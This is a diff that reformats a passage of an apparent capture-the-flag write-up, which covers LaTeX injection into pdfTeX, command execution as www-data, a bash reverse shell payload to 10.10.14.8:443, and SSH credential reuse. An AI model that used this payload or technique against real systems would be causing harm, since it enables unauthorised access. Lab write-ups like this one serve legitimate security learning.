@@ -542,7 +542,7 @@ There are a lot of different `payloads` to exploit a `Latex Injection`, but the 
 
 <br />
 
-Perfect!! We are executing commands as the www-data user:
+Perfect!! We are `executing commands` as the `www-data` user:
 
 <br />
 
@@ -550,7 +550,7 @@ Perfect!! We are executing commands as the www-data user:
 
 <br />
 
-Once we have a RCE, try to establish a Reverse Shell to gain acces to the victim machine:
+Once we have a `RCE`, try to establish a `Reverse Shel`l to gain acces to the `victim machine`:
 
 - Payload -> `\immediate\write18{bash -c 'bash -i >%26 /dev/tcp/10.10.14.8/443 0>%261'}`
 
@@ -582,7 +582,7 @@ Intrusion ready!!!
 
 <br />
 
-Once on the system, we go to the home path and list two users:
+Once on the `system`, we go to the `home path` and list `two users`:
 
 <br />
 
@@ -593,7 +593,7 @@ ayush  sahay
 
 <br />
 
-As we remember, before the exploitation of the pdf, we obtain the ayush credentials for the webmail in the Wordpress post, so we try to reuse them to log in via ssh in that user:
+As we remember, before the exploitation of `pdfTeX`, we obtain the `ayush credentials` for the webmail in the `Wordpress post`, so we try to `reuse` them to log in via `ssh` in that user:
 
 <br />
 
@@ -606,6 +606,6 @@ rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command nam
 
 <br />
 
-Let's go! It worked! But there is a problem, as the ayush shell is apparently restricted.
+Let's go! It worked! But there is a `problem`, as the ayush `shell` is apparently `restricted`.
 
 <br />
